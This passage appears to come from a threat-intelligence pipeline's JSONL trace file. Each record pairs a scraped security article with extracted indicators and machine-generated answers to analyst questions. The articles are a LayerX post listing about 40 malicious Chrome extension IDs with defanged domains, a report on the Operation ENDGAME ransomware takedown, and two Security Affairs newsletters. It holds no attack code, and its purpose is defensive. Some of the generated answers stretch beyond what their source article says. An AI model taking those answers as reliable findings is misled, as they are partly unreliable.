"pbpobpjppnecgcinajfpaninmjkdbidm"}, {"type": "Chrome Extension ID", "value": "gdfjahfbaillhkeigeinoomhjnfajbon"}, {"type": "Chrome Extension ID", "value": "eoalbaojjblgndkffciljmiddhgjdldh"}, {"type": "Chrome Extension ID", "value": "odhmhkkhpibfjijmpgcdjondompgocog"}, {"type": "Chrome Extension ID", "value": "ohhhngpnknpdhmdmpmoccgjmmkkleipn"}, {"type": "Chrome Extension ID", "value": "nejfdccopmpimplhmmdfjobodgeaoihd"}, {"type": "Chrome Extension ID", "value": "dhhmopcmpiadcgchhhldcpoeppcofdic"}, {"type": "Chrome Extension ID", "value": "ffmfnniephcagojkpjddjiogjeoijjgl"}, {"type": "Chrome Extension ID", "value": "nabbdpjneieneepdfnmkdhooellilgho"}, {"type": "Chrome Extension ID", "value": "mldeggofnfaiinachdeidpecmflffoam"}, {"type": "Chrome Extension ID", "value": "pndmbpnfolikhfnfnkmjkkpcgkmaibec"}, {"type": "Chrome Extension ID", "value": "elipckbifniceedgalakgnmgeimfdcdi"}, {"type": "Chrome Extension ID", "value": "kkgmdjjpobmenpkhcclceelekpbnnana"}, {"type": "Chrome Extension ID", "value": "dcnjgfafcnopabhpgoekkgckgkkddpjg"}, {"type": "Chrome Extension ID", "value": "mllkmmdaapekjehapekhjjiednchgmag"}, {"type": "Chrome Extension ID", "value": "bhahpmoebdipfoaadcclkcnieeokebnf"}, {"type": "Chrome Extension ID", "value": "oliiideaalkijolilhhaibhbjfhbdcnm"}], "keywords_found": ["analysis", "malicious", "bitcoin", "phishing", "intelligence", "bank", "transaction", "browser", "threat"], "article_textual_content": "# LayerX Reveals 40+ Malicious Browser Extensions\n\nMichelle Warburg Published - May 22, 2025\n\n- Share:\n\nLayerX has identified over 40 malicious browser extensions that are part of three distinct phishing campaigns.\n\nThe initial detection of this campaign was done by the DomainTools Intelligence (DTI) team, who identified a list of suspicious domains that were communicating with browser extensions masquerading as legitimate brands. However, while the research by DTI provided a list of malicious domains, it did not identify the full list of individual malicious extensions.\n\nBuilding on DTI’s initial research, LayerX investigated the flagged URLs to unearth the actual Chrome extension metadata. By analyzing the associated extension pages, LayerX has been able to identify:\n\n- Extension IDs\n- Extension Names\n- The publishers behind them\n- Extension meta-data such as publication date, last software update, etc.\n\nThis investigation revealed 40+ malicious extensions, many of which are still live on the Google Chrome Store.\n\nThe full list of extensions is provided at the bottom of this post.\n\n## Key Findings from the LayerX Analysis\n\nUpon closer analysis of the extension pages and behaviors, LayerX uncovered several important patterns and insights:\n\n## 1. AI-Generated Extension Pages\n\nThe malicious extension pages exhibited a highly similar structure, formatting, and language, pointing to the likelihood that they were auto-generated using AI tools. This tactic enabled threat actors to rapidly scale their efforts across dozens of fake tools with minimal manual effort.\n\n## 2. Impersonation of Popular Tools and Brands\n\nThe extensions were carefully crafted to mimic well-known platforms, including:\n\n- Fortinet / FortiVPN\n- DeepSeek AI\n- Calendly\n- YouTube helper tools\n- Crypto utilities like DeBank\n\nBy riding on the trust of established names, these malicious tools effectively bypassed user suspicion and evaded scrutiny during installation.\n\n## 3. Sophisticated Brand Masquerading\n\nIt’s not just that they tried to masquerade as known legitimate extensions and/or brands, they tried to make themselves lookalike:\n\n- Registered domain names that looked similar (e.g., calendlydaily[.]world and calendly-director[.com], to impersonate Calendly)\n- For all extensions part of this campaign, the publisher and email contact domain were not a private Gmail account, but an independent domain, to make it appear more credible\n- The contact email addresses followed a standard format of “support@domain-name”, again giving more credibility and making it appear as if there is a legitimate publisher behind it\n\nThese extensions grant attackers persistent access to user sessions, allowing for data theft, impersonation, and potential entry into corporate environments.\n\n## How Organizations Can Respond\n\nThe current wave of malicious extensions highlights a key blind spot in many organizations’ security posture: the browser itself. Here’s how organizations can take proactive steps to mitigate the risks:\n\n## 1. Block Malicious Extensions by Extension ID\n\nOrganizations can manually block malicious extensions through MDM or browser policy enforcement. However, this method is often labor-intensive, requiring security teams to track extension IDs, monitor new threats, and respond in near real-time.\n\n## 2. Enforce Extension Hygiene\n\nAdopt basic hygiene policies for browser extensions:\n\n- Block extensions from unknown or unverified publishers\n- Restrict the installation of young extensions (recently published)\n- Flag extensions with low review count or unusual permission requests\n- Avoid tools associated with suspicious or brand-spoofing domains\n\n## 3. Block Extensions Even If They’ve Been Taken Off the Chrome Store\n\nWhile some compromised extensions have already been removed from the Google Chrome Store, removal from the store does not remove active installations from users’ browsers. Therefore, users and organizations must manually go in and remove them.\n\n## How LayerX Can Help\n\nLayerX provides a purpose-built browser security platform that continuously monitors and evaluates extensions in real-time. It offers full discovery of all extensions, automatic risk classification, and granular enforcement options to block malicious extensions.\n\nAmong other capabilities, it can:\n\n- Automatically block malicious or high-risk extensions\n- Detect extensions that perform suspicious actions such as stealing cookies, injecting scripts, etc.\n- Allow admins to set and enforce extension policies organization-wide\n- Keep pace with fast-moving threats via telemetry and threat intelligence\n\nFor organizations concerned about their browser extension threat surface, LayerX is offering a free browser extension audit. The audit includes discovery of all browser extensions installed in your environment, mapping which users have what extensions installed and actionable recommendations to remediate exposure to malicious extensions.\n\nClick here to sign up for the complementary extension audit.\n\n## List of Malicious Extension IDs:\n\n| Extension ID                     | Extension Name                                     | Publisher                                |\n|----------------------------------|----------------------------------------------------|------------------------------------------|\n| ccollcihnnpcbjcgcjfmabegkpbehnip | FortiVPN                                           | https://forti-vpn[.]com/                 |\n| aeibljandkelbcaaemkdnbaacppjdmom | Manus AI | Free AI Assistant                       | https://manusai[.]sbs                    |\n| fcfmhlijjmckglejcgdclfneafoehafm | Site Stats                                         | https://sitestats[.]world                |\n| abbngaojehjekanfdipifimgmppiojpl | Clothing Brand Name Generator                      | https://clothingbrandnamegenerator[.]app |\n| dohmiglipinohflhapdagfgbldhmoojl | DeBank – Digital Assets                            | winchester[.]abram37                     |\n| acmiibcdcmaghndcahglamnhnlmcmlng | AML Sector | Free Crypto AML Checker               | https://amlsector[.]com                  |\n| mipophmjfhpecleajkijfifmffcjdiac | Crypto Whales Vision                               | https://cryptowhalesvision[.]world       |\n| cknmibbkfbephciofemdjndbgebggnkc | Calendly Daily | Free Meeting Scheduling Software  | https://calendly-daily[.]com             |\n| gmigkpkjegnpmjpmnmgnkhmoinpgdnfc | Calendly Docket | Free Meeting Scheduling Software | https://calendly-docket[.]com            |\n| ahgccenjociolkbpgbfibmfclcfnlaei | CreativeHunter – Free tool for Facebook            | https://creativehunter[.]world           |\n| kjhjnbdjonamibpaalanflmidplhiehe | Twin Web                                           | https://twin-web[.]world                 |\n| pobknfocgoijjmokmhimkfhemcnigdji | EventSphere                                        | https://eventphere[.]com                 |\n| iclckldkfemlnecocpphinnplnmijkol | SQLite browser                                     | https://sqlitebrowser[.]app              |\n| jmpcodajbcpgkebjipbmjdoboehfiddd | DeepSeek AI Chat                                   | https://ai-chat-bot[.]pro                |\n| ihdnbohcfnegemgomjcpckmpnkdgopon | AI Sentence Rewriter                               | https://ai-sentence-rewriter[.]com       |\n| oeefjlikahigmlnplgijgeeecbpemhip | Convert PDF to JPG                                 | https://pdf-to-jpg[.]app                 |\n| aofddmgnidinflambjlfkpboeamdldbd | HTML validator                                     | https://htmlvalidator[.]app              |\n| acchdggcflgidjdcnhnnkfengdcmldae | CMS Checker                                        | https://cmschecker[.]app                 |\n| albakpncdngcejcjdahomfbkakbmafgb | Hourly to salary calculator​                       | https://hourlytosalarycalculator[.]app   |\n| hhlcpmdhlcoghhfgiiopcjbkfmdliknc | CSS validator                                      | https://cssvalidator[.]app               |\n| eheagnmidghfknkcaehacggccfiidhik | Email checker – verify email address in 1-click    | https://email-checker[.]pro              |\n| ckcfkaikieiicfdeomgehmnjglnofhde | Crypto Whale Alert – Blockchain Transaction Data   | https://crypto-whale[.]top               |\n| pbpobpjppnecgcinajfpaninmjkdbidm | Web Analytics – Website Traffic & SEO Checker      | https://web-analytics[.]top              |\n| gdfjahfbaillhkeigeinoomhjnfajbon | Ad Vision – Free Ad Spy tool for Facebook          | https://ad-vision[.]click                |\n| eoalbaojjblgndkffciljmiddhgjdldh | Madgicx Plus – The SuperApp for Meta Advertisers   | https://madgicx-plus[.]com               |\n| odhmhkkhpibfjijmpgcdjondompgocog | Similar Net – Website Traffic & SEO Checker        | https://similar-net[.]com                |\n| ohhhngpnknpdhmdmpmoccgjmmkkleipn | Meta Spy – Free Ad Spy tool for Facebook           | https://meta-spy[.]help                  |\n| nejfdccopmpimplhmmdfjobodgeaoihd | Free VPN – Raccoon | Unlimited VPN                 | https://raccoon-vpn[.]world              |\n| dhhmopcmpiadcgchhhldcpoeppcofdic | Free VPN – Orchid | Unlimited VPN                  | https://orchid-vpn[.]com                 |\n| ffmfnniephcagojkpjddjiogjeoijjgl | VPN Free – Soul VPN Unlimited VPN Proxy            | https://soul-vpn[.]com                   |\n| nabbdpjneieneepdfnmkdhooellilgho | Website monitoring                                 | https://websitemonitoring[.]pro          |\n| mldeggofnfaiinachdeidpecmflffoam | AI Writer                                          | https://aiwriter[.]expert                |\n| pndmbpnfolikhfnfnkmjkkpcgkmaibec | AI Ad Generator                                    | https://aiadgenerator[.]app              |\n| elipckbifniceedgalakgnmgeimfdcdi | Headline Generator                                 | https://headlinegenerator[.]app          |\n| kkgmdjjpobmenpkhcclceelekpbnnana | Web Watch                                          | https://webwatch[.]world                 |\n| dcnjgfafcnopabhpgoekkgckgkkddpjg | Youtube Vision                                     | https://youtube-vision[.]world           |\n| mllkmmdaapekjehapekhjjiednchgmag | Web Metrics – Website Traffic & SEO Checker        | https://web-metrics[.]link               |\n| bhahpmoebdipfoaadcclkcnieeokebnf | Bitcoin price live                                 | https://bitcoin-price[.]live             |\n| oliiideaalkijolilhhaibhbjfhbdcnm | Link shortener                                     | https://u99[.]pro                        |\n\n- Share:\n\n#### Michelle Warburg\n\nStrategy Director at LayerX, bringing 15 years of experience in the cybersecurity including research, threat intelligence, incident response, and data loss prevention (DLP).\n\n### The Enterprise Browser Extension\n\n### Table of Contents\n\n#### Get the Latest from LayerX\n\n## Related Resources\n\n##### Blog Post\n\n### Introducing Full Conversation Tracking: The Next Step in GenAI Data Protection\n\nGenAI Security – Or Insecurity – Is In Your Hands GenAI tools like ChatGPT, Gemini, and Copilot are hot topics among employees. Their adoption is growing among the enterprise employees, as expected, while the software developers are of the highest consumers of GenAI, with almost 40% and sales and marketing professionals are just after with […]\n\n##### Blog Post\n\n### Scaling a Smarter, Safer Browser Future\n\nThe enterprise browser is no longer just a portal to the web, it’s the nerve center of modern work. Recognizing this shift, LayerX set out to rethink how enterprises secure the place where work actually happens. Today we’re excited to share a major milestone on our journey: LayerX has extended its Series A funding by […]\n\n##### Blog Post\n\n### Gartner: The Browser is the new Security Control Point for the SaaS Age\n\nSecure Enterprise Browsers (SEBs) and browser extensions aren’t just add-ons, they’re critical for addressing security gaps that traditional EDR and network solutions miss. Gartner’s latest report makes it clear: if your security stack isn’t focused on the browser, you’re leaving the door wide open. In today’s enterprise environment, securing the browser isn’t optional, it’s fundamental. […]\n\n- Platform\n- Use Cases\n- Resources\n    - LayerX Library\n    - Blog\n    - Glossary\n    - Browser Security Explained\n    - What is Browser Isolation?\n    - What Are Enterprise Browsers?\n- Company\n    - About Us\n    - Careers\n    - Vulnerability Disclosure Program\n\nCopyright © 2025 LayerX Terms &amp; Conditions Privacy Policy Vulnerability Disclosure Program\n\nWe use cookies to make sure our website works seamlessly and to improve your experience with us. By continuing to browse, you agree to the use of cookies. To find out more please refer to our privacy policy."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://securityaffairs.com/178245/cyber-crime/operation-endgame-disrupted-global-ransomware-infrastructure.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The operation targeted initial access malware, including strains such as Bumblebee, Lactrodectus, Qakbot, Hijackloader, DanaBot, Trickbot, and Warmcookie, used in ransomware-as-a-service schemes.", "question": "What kind of malware is it?"}, {"answer": "Operation ENDGAME involves disrupting global ransomware infrastructure, specifically targeting initial access malware used by threat actors to infiltrate systems prior to ransomware deployment.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://securityaffairs.com/178245/cyber-crime/operation-endgame-disrupted-global-ransomware-infrastructure.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://twitter.com/securityaffairs"}, {"type": "Domain or URL", "value": "https://www.facebook.com/securityaffairs"}, {"type": "Domain or URL", "value": "https://mastodon.social/@securityaffairs"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/operation-endgame-disrupted-global-ransomware-infrastructure"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/security-affairs-malware-newsletter-round-46"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/security-affairs-newsletter-round-525"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/silent-ransom-group-targeting-law-firms-the-fbi-warns"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/operation-raptor-led-to-the-arrest-of-270-dark-web-vendors-and-buyers"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/cyber-crime"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/cyber-warfare"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/apt"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/data-breach"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/deep-web"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/digital-id"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/hacking"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/hacktivism"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/intelligence"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/internet-of-things"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/laws-and-regulations"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/malware"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/mobile"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/reports"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/security"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/social-networks"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/terrorism"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/category/ics-scada"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/policies"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/contact-me"}, {"type": "Domain or URL", "value": "email:securityaffairs@gmail.com"}], "keywords_found": ["cybercrime", "cryptocurrency", "apt", "intelligence", "browser", "botnet", "threat"], "article_textual_content": "# Operation ENDGAME disrupted global ransomware infrastructure\n\n## Operation ENDGAME dismantled key ransomware infrastructure, taking down 300 servers, 650 domains, and seizing €21.2M in crypto.\n\nFrom May 19 to 22, 2025, Operation ENDGAME, coordinated by Europol and Eurojust, disrupted global ransomware infrastructure. Law enforcement took down down 300 servers and 650 domains, and issuing 20 international arrest warrants.\n\n“A Command Post was set up at Europol headquarters in The Hague during the action week, with investigators from Canada, Denmark, France, Germany, the Netherlands,  the United Kingdom and the United States working with Europol’s European Cybercrime Centre and its Joint Cybercrime Action Taskforce.” reads the press release published by Europol. “Eurojust has provided essential support to make judicial cooperation effective since the beginning of the investigation in 2024. Coordination by Eurojust ensured that authorities were able to exchange information and align their investigative efforts.”\n\nAuthorities also seized €3.5M in cryptocurrency, bringing the total to over €21.2M. This follows the 2024 botnet crackdown, targeting evolving malware threats and cybercriminal groups.\n\nThe operation targeted initial access malware used by threat actors to infiltrate systems prior to ransomware deployment. Neutralized strains include Bumblebee, Lactrodectus, Qakbot, Hijackloader, DanaBot, Trickbot, and Warmcookie, all commonly used in ransomware-as-a-service schemes. Authorities also issued 20 international arrest warrants for key operators.\n\nSeveral key suspects behind malware operations are now under international and public alerts. Germany will list 18 of them on the EU Most Wanted list from May 23. They allegedly provided or operated tools used in major ransomware attacks.\n\n“This new phase demonstrates law enforcement’s ability to adapt and strike again, even as cybercriminals retool and reorganise. By disrupting the services criminals rely on to deploy ransomware, we are breaking the kill chain at its source.” said Catherine De Bolle, Europol Executive Director.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, Operation ENDGAME)\n\n#### you might also like\n\n##### SECURITY AFFAIRS MALWARE NEWSLETTER ROUND 46\n\n##### Security Affairs newsletter Round 525 by Pierluigi Paganini – INTERNATIONAL EDITION\n\n#### leave a comment\n\n#### newsletter\n\n###### Subscribe to my email list and stay\n up-to-date!\n\n#### recent articles\n\n###### SECURITY AFFAIRS MALWARE NEWSLETTER ROUND 46\n\nBreaking News / May 25, 2025\n\n###### Security Affairs newsletter Round 525 by Pierluigi Paganini – INTERNATIONAL EDITION\n\nBreaking News / May 25, 2025\n\n###### Operation ENDGAME disrupted global ransomware infrastructure\n\nCyber Crime / May 25, 2025\n\n###### Silent Ransom Group targeting law firms, the FBI warns\n\nMalware / May 24, 2025\n\n###### Operation RapTor led to the arrest of 270 dark web vendors and buyers\n\nDeep Web / May 23, 2025\n\nTo contact me write an email to:\n\n\n                            Pierluigi Paganini : \n\n[email protected]\n\n#### QUICK LINKS\n\n- Home\n- Cyber Crime\n- Cyber warfare\n- APT\n- Data Breach\n- Deep Web\n- Digital ID\n- Hacking\n- Hacktivism\n- Intelligence\n- Internet of Things\n- Laws and regulations\n- Malware\n- Mobile\n- Reports\n- Security\n- Social Networks\n- Terrorism\n- ICS-SCADA\n- POLICIES\n- Contact me\n\nCopyright@securityaffairs 2024\n\nWe use cookies on our website to give you the most relevant experience by remembering your preferences and repeat visits. By clicking “Accept All”, you consent to the use of ALL the cookies. However, you may visit \"Cookie Settings\" to provide a controlled consent.\n\n#### Privacy Overview\n\nThis website uses cookies to improve your experience while you navigate through the website. Out of these cookies, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may have an effect on your browsing experience.\n\nNecessary cookies are absolutely essential for the website to function properly. This category only includes cookies that ensures basic functionalities and security features of the website. These cookies do not store any personal information.\n\nAny cookies that may not be particularly necessary for the website to function and is used specifically to collect user personal data via analytics, ads, other embedded contents are termed as non-necessary cookies. It is mandatory to procure user consent prior to running these cookies on your website."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://securityaffairs.com/178265/breaking-news/security-affairs-malware-newsletter-round-46.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The context mentions various types of malware, including ransomware, infostealers, and backdoors, such as Sarcoma Ransomware, LummaC2, and MarsSnake Backdoor.", "question": "What kind of malware is it?"}, {"answer": "The context involves various types of malware attacks, including ransomware, double extortion, and infostealer attacks, as well as exploits of zero-day vulnerabilities and misconfigured systems.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, credential theft from the browser is mentioned, specifically with the Lumma Stealer and StealC infostealers.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious Chrome extensions, as mentioned in the article \"Hidden Threats of Dual-Function Malware Found in Chrome Extensions\".", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The context mentions that some malware, such as Lumma Stealer and Vidar, are used to steal sensitive data, but it does not specifically mention credit cards or bank information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Lumma Stealer is mentioned as an infostealer, which suggests it is related to stealing sensitive information, potentially including wallet data.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals various types of information, including network and host data, sensitive data from organizations, and valid social media accounts.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations include Saudi Organization, Russian Organizations, and South Asia's public sector, as well as Western Logistics Entities and Technology Companies.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://securityaffairs.com/178265/breaking-news/security-affairs-malware-newsletter-round-46.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://twitter.com/securityaffairs"}, {"type": "Domain or URL", "value": "https://www.facebook.com/securityaffairs"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/privacy-policy"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/contact-me"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/newsletter"}, {"type": "Domain or URL", "value": "email:securityaffairs@gmail.com"}], "keywords_found": ["cryptocurrency", "malicious", "backdoor", "apt", "intelligence", "bank", "browser", "infostealers", "threat"], "article_textual_content": "# SECURITY AFFAIRS MALWARE NEWSLETTER ROUND 46\n\n## Security Affairs Malware newsletter includes a collection of the best articles and research on malware in the international landscape\n\nSarcoma Ransomware Unveiled: Anatomy of a Double Extortion Gang\n\nRVTools Bumblebee Malware Attack – How a Trusted IT Tool Became a Malware Delivery Vector\n\nMalicious ‘Checker’ Packages on PyPI Probe TikTok and Instagram for Valid Accounts\n\nRedisRaider: Weaponizing misconfigured Redis to mine cryptocurrency at scale\n\nHidden Threats of Dual-Function Malware Found in Chrome Extensions\n\nChinese Hackers Deploy MarsSnake Backdoor in Multi-Year Attack on Saudi Organization\n\nThreat Actors Deploy LummaC2 Malware to Exfiltrate Sensitive Data from Organizations\n\nPure Harm: PureRAT Attacks Russian Organizations\n\nLumma Stealer: Breaking down the delivery techniques and capabilities of a prolific infostealer\n\nA Brief History of DanaBot, Longtime Ecrime Juggernaut Disrupted by Operation Endgame\n\nBumblebee malware distributed via Zenmap, WinMRT SEO poisoning\n\n60 Malicious npm Packages Leak Network and Host Data in Active Malware Campaign\n\nFollowing the spiders: Investigating Lactrodectus malware\n\nTikTok Videos Promise Pirated Apps, Deliver Vidar and StealC Infostealers Instead\n\nRussian GRU Targeting Western Logistics Entities and Technology Companies\n\nA familiar playbook with a twist: 3AM ransomware actors dropped virtual machine with vishing and Quick Assist\n\nFrom banks to battalions: SideWinder’s attacks on South Asia’s public sector\n\nUAT-6382 exploits Cityworks zero-day vulnerability to deliver malware\n\nConsistent and Compatible Modelling of Cyber Intrusions and Incident Response Demonstrated in the Context of Malware Attacks on Critical Infrastructure\n\nMalware families discovery via Open-Set Recognition on Android manifest permissions\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, newsletter)\n\n#### you might also like\n\n##### Security Affairs newsletter Round 525 by Pierluigi Paganini – INTERNATIONAL EDITION\n\n##### Operation ENDGAME disrupted global ransomware infrastructure\n\n#### leave a comment\n\n#### newsletter\n\n###### Subscribe to my email list and stay\n up-to-date!\n\n#### recent articles\n\n###### SECURITY AFFAIRS MALWARE NEWSLETTER ROUND 46\n\nBreaking News / May 25, 2025\n\n###### Security Affairs newsletter Round 525 by Pierluigi Paganini – INTERNATIONAL EDITION\n\nBreaking News / May 25, 2025\n\n###### Operation ENDGAME disrupted global ransomware infrastructure\n\nCyber Crime / May 25, 2025\n\n###### Silent Ransom Group targeting law firms, the FBI warns\n\nMalware / May 24, 2025\n\n###### Operation RapTor led to the arrest of 270 dark web vendors and buyers\n\nDeep Web / May 23, 2025\n\nTo contact me write an email to:\n\n\n                            Pierluigi Paganini : \n\n[email protected]\n\n#### QUICK LINKS\n\n- Home\n- Cyber Crime\n- Cyber warfare\n- APT\n- Data Breach\n- Deep Web\n- Digital ID\n- Hacking\n- Hacktivism\n- Intelligence\n- Internet of Things\n- Laws and regulations\n- Malware\n- Mobile\n- Reports\n- Security\n- Social Networks\n- Terrorism\n- ICS-SCADA\n- POLICIES\n- Contact me\n\nCopyright@securityaffairs 2024\n\nWe use cookies on our website to give you the most relevant experience by remembering your preferences and repeat visits. By clicking “Accept All”, you consent to the use of ALL the cookies. However, you may visit \"Cookie Settings\" to provide a controlled consent.\n\n#### Privacy Overview\n\nThis website uses cookies to improve your experience while you navigate through the website. Out of these cookies, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may have an effect on your browsing experience.\n\nNecessary cookies are absolutely essential for the website to function properly. This category only includes cookies that ensures basic functionalities and security features of the website. These cookies do not store any personal information.\n\nAny cookies that may not be particularly necessary for the website to function and is used specifically to collect user personal data via analytics, ads, other embedded contents are termed as non-necessary cookies. It is mandatory to procure user consent prior to running these cookies on your website."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://securityaffairs.com/178257/breaking-news/security-affairs-newsletter-round-525-by-pierluigi-paganini-international-edition.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "The context mentions various types of attacks, including ransomware, cybercrime, malware, and DDoS attacks.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, there is credential theft from the browser, as mentioned in the context with examples such as Vidar and StealC Infostealers.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the Hidden Threats of Dual-Function Malware was found in Chrome extensions.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals various types of information, including SIM card information, subscriber data, and personal data, such as in the case of the Vidar and StealC infostealers which steal sensitive information.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations and entities include South Asia's public sector, Western logistics entities, and technology companies, as well as law firms. Specific targets mentioned include Commvault's SaaS Cloud Application, Cityworks, and O2 VoLTE customers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://securityaffairs.com/178257/breaking-news/security-affairs-newsletter-round-525-by-pierluigi-paganini-international-edition.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://securityaffairs.co/wordpress/"}, {"type": "Domain or URL", "value": "https://twitter.com/securityaffairs"}, {"type": "Domain or URL", "value": "https://www.facebook.com/SecurityAffairs/"}, {"type": "Domain or URL", "value": "https://mastodon.social/@securityaffairs"}, {"type": "Domain or URL", "value": "email: [pierluigi.paganini@securityaffairs.co](mailto:pierluigi.paganini@securityaffairs.co)"}], "keywords_found": ["cybercrime", "cryptocurrency", "malicious", "apt", "intelligence", "bank", "browser", "infostealers", "threat"], "article_textual_content": "# Security Affairs newsletter Round 525 by Pierluigi Paganini – INTERNATIONAL EDITION\n\n## A new round of the weekly Securitythe weekly Security Affairs newsletterAffairs newsletter arrived! Every week the best security articles from Security Affairs are free in your email box.\n\nEnjoy a new round of the weekly SecurityAffairs newsletter, including the international press.\n\nInternational Press – Newsletter\n\nCybercrime\n\nM&amp;S hackers believed to have gained access through third party\n\nDomestic abuse victim data stolen in Legal Aid hack\n\nAn $8.4 Billion Chinese Hub for Crypto Crime Is Incorporated in Colorado\n\n“SKT All Subscribers’ SIM Card Information Leaked”… Malicious Codes Increase to 25 Types\n\nWorcester College Student to Plead Guilty to Cyber Extortions\n\nA familiar playbook with a twist: 3AM ransomware actors dropped virtual machine with vishing and Quick Assist\n\nCellcom Service Disruption Caused by Cyberattack\n\nJustice Department Seizes Domains Behind Major Information-Stealing Malware Operation\n\n270 arrested in global dark web crackdown targeting online drug and criminal networks\n\nKrebsOnSecurity Hit With Near-Record 6.3 Tbps DDoS\n\nTikTok Videos Promise Pirated Apps, Deliver Vidar and StealC Infostealers Instead\n\nLeader of Qakbot Malware Conspiracy Indicted for Involvement in Global Ransomware 